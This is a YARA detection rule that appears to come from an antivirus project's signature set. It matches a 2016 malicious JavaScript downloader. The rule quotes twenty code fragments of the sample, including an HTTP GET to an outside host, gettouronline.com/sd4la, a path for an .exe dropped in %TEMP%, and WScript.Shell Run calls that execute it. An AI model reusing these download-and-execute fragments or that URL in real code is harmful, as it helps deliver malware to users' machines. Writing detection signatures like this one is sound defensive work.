rule sig_20160328_0255859cc8a85c783759a10014daf8d7 {
  meta:
    description = "datamaliciousorder - file 20160328_0255859cc8a85c783759a10014daf8d7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "61c81afb762109527daf0a045d6423ed0f3cdd22828b2509b796f67dbc2ccf12"

  strings:
    $s1  = "function Ccusjnvczi() {return Arwzn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"l8TymGYstawUc.exe\";};" fullword ascii
    $s2  = "Plfzolyonp[Bezwnsl](\"GET\", \"http://gettouronline.com/sd4la\", false);" fullword ascii
    $s3  = "do {WScript[Sdnxqbvl](Ccotuwzga() * 11)} while (Plfzolyonp[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Gqjli(Pabokx, Mxfnqzep){return Pabokx - Mxfnqzep;};" fullword ascii
    $s5  = "var Arwzn = function Gghfwg() {return WScript[Ufoapb](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Bkpjsfthw(Empkq){Arwzn[\"Run\"](Empkq, Yqozqflt, Yqozqflt);};" fullword ascii
    $s7  = "function Aagtrunhry(){return Ljzntlq;};" fullword ascii
    $s8  = "function Buzoeo() {return ((Ckzhguz == true) && (Ckzhguz == Lxfgflcyxh)) ? 1 : Yqozqflt;};" fullword ascii
    $s9  = "var Lxfgflcyxh = false;" fullword ascii
    $s10 = " while (Bxcjrbe){" fullword ascii
    $s11 = "function Qzemgqbnnr(Fuyqamxzzb) {var Wqvcpwmmmc = (1, 2, 3, 4, 5, Fuyqamxzzb); return Wqvcpwmmmc;};" fullword ascii
    $s12 = "Lxfgflcyxh = true; " fullword ascii
    $s13 = "var Ckzhguz = false;" fullword ascii
    $s14 = "var Vccwydwynl = false;" fullword ascii
    $s15 = "return Gqjli(Trrbe, Layqir);" fullword ascii
    $s16 = "function Tcmrx()" fullword ascii
    $s17 = "function Mbgmonow(){return Ufoapb;};" fullword ascii
    $s18 = "Ckzhguz = true; " fullword ascii
    $s19 = "var Hmvckw = new this[\"Date\"]();" fullword ascii
    $s20 = "function Ccotuwzga(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}